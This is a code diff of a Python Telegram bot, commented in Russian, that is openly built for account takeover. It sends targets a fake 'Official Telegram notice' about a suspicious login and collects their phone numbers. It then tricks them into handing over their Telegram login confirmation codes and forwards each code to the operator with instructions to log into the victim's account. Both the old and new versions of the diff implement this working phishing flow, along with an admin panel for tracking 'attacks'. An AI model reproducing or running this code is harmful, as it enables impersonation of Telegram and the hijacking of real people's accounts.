@@ -4,30 +4,25 @@ import time
 import sqlite3
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# Читаем переменные из Railway
+# ========== ПЕРЕМЕННЫЕ ИЗ RAILWAY ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = os.environ.get('ADMIN_ID')
 
 if not BOT_TOKEN or not ADMIN_ID:
     print("❌ Ошибка: Добавь BOT_TOKEN и ADMIN_ID в Variables на Railway!")
-    print("📝 Как добавить:")
-    print("1. Зайди в проект на Railway")
-    print("2. Вкладка Variables")
-    print("3. Добавь BOT_TOKEN и ADMIN_ID")
     exit(1)
 
-# Преобразуем ADMIN_ID в число
 try:
     ADMIN_ID = int(ADMIN_ID)
 except:
-    print("❌ Ошибка: ADMIN_ID должен быть числом!")
+    print("❌ Ошибка: ADMIN_ID должен быть числом")
     exit(1)
 
 bot = telebot.TeleBot(BOT_TOKEN)
-print(f"✅ Бот запущен!")
+print("✅ Бот запущен")
 print(f"👤 Админ ID: {ADMIN_ID}")
 
-# База данных
+# ========== БАЗА ДАННЫХ ==========
 conn = sqlite3.connect('attacks.db', check_same_thread=False)
 cursor = conn.cursor()
 cursor.execute('''CREATE TABLE IF NOT EXISTS attacks
@@ -39,24 +34,148 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS attacks
                    timestamp TEXT)''')
 conn.commit()
 
-# Словарь для временных данных
-attack_data = {}
-
-# ========== КОМАНДЫ ДЛЯ АДМИНА (ТЕБЯ) ==========
-
+# ========== ЧТО ВИДИТ ЖЕРТВА ==========
 @bot.message_handler(commands=['start'])
-def admin_start(message):
-    if message.from_user.id != ADMIN_ID:
+def victim_start(message):
+    if message.from_user.id == ADMIN_ID:
+        # Админ видит панель управления
+        show_admin_panel(message)
         return
-    
+
+    # Жертва видит официальное сообщение
+    markup = InlineKeyboardMarkup()
+    btn = InlineKeyboardButton("✅ Подтвердить номер", callback_data="victim_confirm")
+    markup.add(btn)
+
+    bot.send_message(
+        message.chat.id,
+        "🔐 *Официальное уведомление Telegram*\n\n"
+        "Зафиксирована попытка входа в ваш аккаунт с нового устройства.\n"
+        "Если это были не вы — подтвердите, что номер принадлежит вам.\n\n"
+        "📍 *Время:* " + time.ctime() + "\n"
+        "📍 *Устройство:* iPhone 13\n"
+        "📍 *Местоположение:* Москва, Россия",
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+# ========== ЖЕРТВА НАЖАЛА КНОПКУ ==========
+@bot.callback_query_handler(func=lambda call: call.data == "victim_confirm")
+def victim_confirm_handler(call):
+    victim_id = call.from_user.id
+
+    msg = bot.send_message(
+        victim_id,
+        "📱 Введите ваш номер телефона в международном формате:\n"
+        "`+79161234567`",
+        parse_mode="Markdown"
+    )
+    bot.register_next_step_handler(msg, victim_enter_phone)
+
+# ========== ЖЕРТВА ВВЕЛА НОМЕР ==========
+def victim_enter_phone(message):
+    phone = message.text
+    victim_id = message.from_user.id
+
+    # Сохраняем в базу
+    cursor.execute(
+        "INSERT INTO attacks (phone, victim_user_id, status, timestamp) VALUES (?, ?, ?, ?)",
+        (phone, victim_id, 'waiting_code', time.ctime())
+    )
+    conn.commit()
+    attack_id = cursor.lastrowid
+
+    bot.send_message(
+        victim_id,
+        "📨 Код подтверждения отправлен вам в Telegram.\n"
+        "Как только получите — отправьте его сюда."
+    )
+
+    # Уведомление админу
+    bot.send_message(
+        ADMIN_ID,
+        f"👤 *Жертва готова!*\n"
+        f"ID атаки: {attack_id}\n"
+        f"Телефон: {phone}\n\n"
+        f"Теперь пытайся войти в аккаунт жертвы!",
+        parse_mode="Markdown"
+    )
+
+# ========== ЖЕРТВА ОТПРАВЛЯЕТ КОД ==========
+@bot.message_handler(func=lambda message: True)
+def victim_send_code(message):
+    if message.from_user.id == ADMIN_ID:
+        return
+
+    cursor.execute(
+        "SELECT id FROM attacks WHERE victim_user_id = ? AND status = 'waiting_code'",
+        (message.from_user.id,)
+    )
+    attack = cursor.fetchone()
+
+    if attack and message.text and message.text.isdigit() and len(message.text) <= 6:
+        attack_id = attack[0]
+        code = message.text
+
+        cursor.execute(
+            "UPDATE attacks SET code = ?, status = 'code_received' WHERE id = ?",
+            (code, attack_id)
+        )
+        conn.commit()
+
+        markup = InlineKeyboardMarkup()
+        btn = InlineKeyboardButton("✅ Подтвердить код", callback_data=f"approve_{attack_id}")
+        markup.add(btn)
+
+        bot.send_message(
+            message.chat.id,
+            f"🔐 Код: `{code}`\n\n"
+            f"Это ваш код? Нажмите подтвердить.",
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
+
+# ========== ЖЕРТВА ПОДТВЕРДИЛА КОД ==========
+@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
+def victim_approve_code(call):
+    attack_id = int(call.data.replace('approve_', ''))
+
+    cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
+    row = cursor.fetchone()
+    if not row:
+        return
+
+    code, phone = row
+
+    bot.send_message(
+        ADMIN_ID,
+        f"🔥 *КОД ПОЛУЧЕН!*\n\n"
+        f"ID атаки: {attack_id}\n"
+        f"Телефон: {phone}\n"
+        f"Код: `{code}`\n"
+        f"Время: {time.ctime()}\n\n"
+        f"Введи этот код в Telegram.",
+        parse_mode="Markdown"
+    )
+
+    bot.send_message(
+        call.message.chat.id,
+        "✅ Номер подтверждён. Доступ восстановлен."
+    )
+
+    cursor.execute("UPDATE attacks SET status = 'completed' WHERE id = ?", (attack_id,))
+    conn.commit()
+
+# ========== ПАНЕЛЬ АДМИНА ==========
+def show_admin_panel(message):
     markup = InlineKeyboardMarkup()
     btn1 = InlineKeyboardButton("🎯 Новая атака", callback_data="new_attack")
     btn2 = InlineKeyboardButton("📊 Активные атаки", callback_data="list_attacks")
     markup.add(btn1, btn2)
-    
+
     bot.send_message(
         ADMIN_ID,
-        "🔐 *Панель управления атаками*\n\n"
+        "🔐 *Панель управления*\n\n"
         "Выберите действие:",
         parse_mode="Markdown",
         reply_markup=markup
@@ -65,281 +184,62 @@ def admin_start(message):
 @bot.callback_query_handler(func=lambda call: call.from_user.id == ADMIN_ID)
 def admin_callback(call):
     if call.data == "new_attack":
-        # Просим ввести номер жертвы
         msg = bot.send_message(
             ADMIN_ID,
-            "📱 Введите номер жертвы в международном формате:\n"
+            "📱 Введите номер жертвы:\n"
             "Например: +79161234567",
             parse_mode="Markdown"
         )
-        bot.register_next_step_handler(msg, process_attack_number)
-    
+        bot.register_next_step_handler(msg, process_admin_phone)
+
     elif call.data == "list_attacks":
         show_active_attacks()
 
-def process_attack_number(message):
-    """Ты ввел номер жертвы"""
+def process_admin_phone(message):
     phone = message.text
-    
-    # Сохраняем номер для атаки
-    attack_data['target_phone'] = phone
-    attack_data['step'] = 'waiting_username'
-    
-    # Просим username (чтобы отправить сообщение)
-    msg = bot.send_message(
-        ADMIN_ID,
-        f"📱 Номер: {phone}\n\n"
-        f"Введите username жертвы (если знаете):\n"
-        f"Например: @ivanov\n\n"
-        f"Если не знаете - отправьте 0",
-        parse_mode="Markdown"
-    )
-    bot.register_next_step_handler(msg, process_username)
 
-def process_username(message):
-    """Ты ввел username или 0"""
-    username = message.text
-    phone = attack_data.get('target_phone')
-    
-    if username != '0':
-        # Пытаемся найти пользователя по username
-        try:
-            user_info = bot.get_chat(username)
-            victim_user_id = user_info.id
-            
-            # Сохраняем в базу
-            cursor.execute(
-                "INSERT INTO attacks (phone, victim_user_id, status, timestamp) VALUES (?, ?, ?, ?)",
-                (phone, victim_user_id, 'message_sent', time.ctime())
-            )
-            conn.commit()
-            attack_id = cursor.lastrowid
-            
-            # Отправляем сообщение жертве
-            send_phishing_message(victim_user_id, phone, attack_id)
-            
-            bot.send_message(
-                ADMIN_ID,
-                f"✅ Сообщение отправлено пользователю {username}\n"
-                f"ID атаки: {attack_id}\n\n"
-                f"Теперь пытайся войти в аккаунт жертвы!",
-                parse_mode="Markdown"
-            )
-            
-        except Exception as e:
-            bot.send_message(
-                ADMIN_ID,
-                f"❌ Не удалось найти пользователя: {e}\n"
-                f"Попробуй другой username или отправь 0"
-            )
-    else:
-        # Без username - ждем пока жертва сама напишет
-        bot.send_message(
-            ADMIN_ID,
-            f"⚠️ Режим ожидания...\n"
-            f"Номер: {phone}\n\n"
-            f"Отправь жертве ссылку на бота:\n"
-            f"https://t.me/твой_бот\n\n"
-            f"Когда она напишет - я пришлю уведомление!"
-        )
-
-def send_phishing_message(user_id, phone, attack_id):
-    """Отправляем фишинговое сообщение жертве"""
-    
-    markup = InlineKeyboardMarkup()
-    btn = InlineKeyboardButton("✅ Это мой номер", callback_data=f"confirm_{attack_id}")
-    markup.add(btn)
-    
-    try:
-        bot.send_message(
-            user_id,
-            "🔐 *Официальное уведомление Telegram*\n\n"
-            "Зафиксирована попытка входа в ваш аккаунт.\n"
-            f"📱 Номер: {phone}\n"
-            f"🕐 Время: {time.ctime()}\n"
-            f"📍 Устройство: iPhone 13\n\n"
-            "Если это вы - нажмите кнопку подтверждения.\n"
-            "Если нет - проигнорируйте сообщение.",
-            parse_mode="Markdown",
-            reply_markup=markup
-        )
-        return True
-    except:
-        return False
-
-# ========== ОБРАБОТКА ДЕЙСТВИЙ ЖЕРТВЫ ==========
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_'))
-def victim_confirmed(call):
-    """Жертва нажала кнопку подтверждения"""
-    victim_id = call.from_user.id
-    attack_id = int(call.data.replace('confirm_', ''))
-    
-    # Обновляем статус атаки
-    cursor.execute(
-        "UPDATE attacks SET status = 'waiting_code', victim_user_id = ? WHERE id = ?",
-        (victim_id, attack_id)
-    )
-    conn.commit()
-    
-    # Просим ввести номер (для подтверждения)
-    msg = bot.send_message(
-        victim_id,
-        "📱 Для подтверждения введите ваш номер телефона:\n"
-        "`+79161234567`",
-        parse_mode="Markdown"
-    )
-    bot.register_next_step_handler(msg, victim_enter_phone, attack_id)
-
-def victim_enter_phone(message, attack_id):
-    """Жертва ввела номер"""
-    phone = message.text
-    
-    # Обновляем номер в базе
-    cursor.execute(
-        "UPDATE attacks SET phone = ?, status = 'waiting_code' WHERE id = ?",
-        (phone, attack_id)
-    )
-    conn.commit()
-    
-    bot.send_message(
-        message.chat.id,
-        "📨 Сейчас на ваш Telegram придет код подтверждения.\n"
-        "Как только получите - отправьте его сюда."
-    )
-    
-    # Уведомляем админа
     bot.send_message(
         ADMIN_ID,
-        f"👤 *Жертва готова!*\n"
-        f"ID атаки: {attack_id}\n"
-        f"Телефон: {phone}\n\n"
-        f"Теперь пытайся войти в аккаунт!",
+        f"⚠️ *Режим ожидания*\n"
+        f"Номер: {phone}\n\n"
+        f"Отправь жертве ссылку:\n"
+        f"https://t.me/{bot.get_me().username}\n\n"
+        f"Как только жертва напишет — я пришлю уведомление.",
         parse_mode="Markdown"
     )
-
-@bot.message_handler(func=lambda message: True)
-def victim_send_code(message):
-    """Жертва отправляет код"""
-    # Проверяем, есть ли активная атака для этого пользователя
-    cursor.execute(
-        "SELECT id FROM attacks WHERE victim_user_id = ? AND status = 'waiting_code'",
-        (message.from_user.id,)
-    )
-    attack = cursor.fetchone()
-    
-    if attack and message.text and message.text.isdigit() and len(message.text) <= 6:
-        attack_id = attack[0]
-        code = message.text
-        
-        # Сохраняем код
-        cursor.execute(
-            "UPDATE attacks SET code = ?, status = 'code_received' WHERE id = ?",
-            (code, attack_id)
-        )
-        conn.commit()
-        
-        # Кнопка подтверждения
-        markup = InlineKeyboardMarkup()
-        btn = InlineKeyboardButton("✅ Подтвердить код", callback_data=f"approve_{attack_id}")
-        markup.add(btn)
-        
-        bot.send_message(
-            message.chat.id,
-            f"🔐 Код: {code}\n\n"
-            f"Это ваш код? Нажмите подтвердить.",
-            reply_markup=markup
-        )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
-def victim_approve_code(call):
-    """Жертва подтвердила код"""
-    attack_id = int(call.data.replace('approve_', ''))
-    
-    # Получаем код из базы
-    cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
-    result = cursor.fetchone()
-    if not result:
-        return
-    
-    code, phone = result
-    
-    # Отправляем код админу (ТЕБЕ!)
-    bot.send_message(
-        ADMIN_ID,
-        f"🔥 *КОД ПОЛУЧЕН!*\n\n"
-        f"🎯 ID атаки: {attack_id}\n"
-        f"📞 Телефон: {phone}\n"
-        f"🔑 Код: `{code}`\n"
-        f"⏰ Время: {time.ctime()}\n\n"
-        f"Введи этот код в Telegram и войди в аккаунт!",
-        parse_mode="Markdown"
-    )
-    
-    # Подтверждаем жертве
-    bot.send_message(
-        call.message.chat.id,
-        "✅ Код подтвержден! Доступ восстановлен."
-    )
-    
-    # Обновляем статус
-    cursor.execute("UPDATE attacks SET status = 'completed' WHERE id = ?", (attack_id,))
-    conn.commit()
-
-# ========== КОМАНДЫ ДЛЯ АДМИНА ==========
-
-@bot.message_handler(commands=['getcode'])
-def admin_get_code(message):
-    """Команда для получения кода"""
-    if message.from_user.id != ADMIN_ID:
-        return
-    
-    try:
-        attack_id = int(message.text.split()[1])
-        
-        cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
-        result = cursor.fetchone()
-        if result:
-            code, phone = result
-            bot.send_message(
-                ADMIN_ID,
-                f"🔑 Код для атаки {attack_id}:\n"
-                f"Телефон: {phone}\n"
-                f"Код: `{code}`",
-                parse_mode="Markdown"
-            )
-        else:
-            bot.send_message(ADMIN_ID, "Код еще не получен")
-    except:
-        bot.send_message(ADMIN_ID, "Использование: /getcode ID_АТАКИ")
 
 def show_active_attacks():
-    """Показать активные атаки"""
     cursor.execute(
         "SELECT id, phone, status, timestamp FROM attacks WHERE status != 'completed' ORDER BY id DESC"
     )
     attacks = cursor.fetchall()
-    
+
     if not attacks:
         bot.send_message(ADMIN_ID, "Нет активных атак")
         return
-    
+
     text = "📊 *Активные атаки:*\n\n"
     for a in attacks:
-        status_emoji = {
-            'message_sent': '📨',
-            'waiting_code': '⏳',
-            'code_received': '🔑'
-        }.get(a[2], '❓')
-        
-        text += f"{status_emoji} ID: {a[0]} | {a[1]}\n"
-        text += f"   Статус: {a[2]}\n"
-        text += f"   Время: {a[3]}\n\n"
-    
+        emoji = {'waiting_code': '⏳', 'code_received': '🔑', 'message_sent': '📨'}.get(a[2], '❓')
+        text += f"{emoji} ID: {a[0]} | {a[1]}\n   Статус: {a[2]}\n   {a[3]}\n\n"
+
     bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
 
+@bot.message_handler(commands=['getcode'])
+def getcode(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    try:
+        attack_id = int(message.text.split()[1])
+        cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
+        row = cursor.fetchone()
+        if row:
+            bot.send_message(ADMIN_ID, f"🔑 Код: `{row[0]}`\nТелефон: {row[1]}", parse_mode="Markdown")
+        else:
+            bot.send_message(ADMIN_ID, "Кода нет")
+    except:
+        bot.send_message(ADMIN_ID, "Использование: /getcode ID")
+
 if __name__ == "__main__":
-    print("🤖 Бот-перехватчик запущен!")
-    print(f"👤 Админ ID: {ADMIN_ID}")
-    print("🎯 Режим: ты вводишь номер → бот пишет жертве → ты получаешь код")
+    print("🎯 Бот-перехватчик запущен")
     bot.polling()
